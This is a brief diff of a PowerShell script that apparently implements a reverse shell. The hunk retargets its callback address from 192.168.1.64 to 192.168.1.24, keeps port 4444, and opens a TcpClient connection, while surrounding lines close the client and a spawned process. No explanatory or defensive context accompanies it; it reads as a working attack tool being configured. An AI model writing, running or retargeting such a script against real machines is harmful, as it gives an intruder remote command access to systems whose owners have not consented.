@@ -3,7 +3,7 @@ if ($client.Connected -eq $true) {$client.Close()}
 if ($process.ExitCode -ne $null) {$process.Close()}
 exit}
 
-$address = '192.168.1.64'
+$address = '192.168.1.24'
 $port = '4444'
 
 $client = New-Object system.net.sockets.tcpclient
